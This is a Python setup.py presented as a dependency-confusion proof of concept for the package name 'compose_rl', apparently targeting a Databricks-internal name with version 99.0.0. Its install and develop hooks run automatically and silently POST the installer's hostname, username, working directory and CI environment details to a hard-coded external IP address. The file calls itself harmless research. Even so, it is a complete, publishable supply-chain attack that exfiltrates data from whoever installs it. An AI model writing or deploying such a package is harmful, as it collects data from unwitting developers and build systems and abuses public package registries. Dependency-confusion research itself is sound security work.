#!/usr/bin/env python3
"""
Security Research PoC — Dependency Confusion
This package exists solely to demonstrate that the package name
was unclaimed on PyPI. It performs a single harmless HTTP callback
to prove installation occurred. No malicious actions are taken.

Contact: [YOUR HACKERONE PROFILE]
"""
from setuptools import setup
from setuptools.command.install import install
from setuptools.command.develop import develop
import os
import json
import socket
import urllib.request

CALLBACK_URL = "http://54.80.197.209:8443/cb/compose_rl"
PKG_NAME = "compose_rl"
COMPANY = "databricks"


def _phone_home():
    """Harmless callback — collects only machine identity info."""
    try:
        info = {
            "pkg": PKG_NAME,
            "h": socket.gethostname(),
            "u": os.getenv("USER", os.getenv("USERNAME", "unknown")),
            "c": os.getcwd()[:128],
            "id": f"{PKG_NAME}-{COMPANY}",
            "pip_ver": "",
            "ci": os.getenv("CI", os.getenv("GITHUB_ACTIONS", os.getenv("JENKINS_URL", ""))),
        }
        # Try to get pip version for context
        try:
            import pip
            info["pip_ver"] = pip.__version__
        except Exception:
            pass
        data = json.dumps(info).encode("utf-8")
        req = urllib.request.Request(
            CALLBACK_URL,
            data=data,
            headers={"Content-Type": "application/json", "User-Agent": "security-research-poc"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        # Never fail the install — this is just a PoC callback
        pass


class PostInstallCommand(install):
    def run(self):
        _phone_home()
        install.run(self)


class PostDevelopCommand(develop):
    def run(self):
        _phone_home()
        develop.run(self)


setup(
    name=PKG_NAME,
    version="99.0.0",
    description="Security research — dependency confusion PoC. This package name was unclaimed. Contact via HackerOne.",
    long_description="""# Security Research — Dependency Confusion PoC

This package was registered as part of authorized security research
to demonstrate that the package name was unclaimed on PyPI despite
being referenced in official documentation.

**This package does NOT contain malicious code.** It performs a single
harmless HTTP callback to prove installation occurred.

If you are the package owner, please contact the researcher via HackerOne
to coordinate responsible disclosure and transfer of this package name.
""",
    long_description_content_type="text/markdown",
    author="Security Researcher",
    author_email="security-research@example.com",
    url="https://github.com/example/security-research",
    python_requires=">=3.6",
    py_modules=[],
    cmdclass={
        "install": PostInstallCommand,
        "develop": PostDevelopCommand,
    },
)
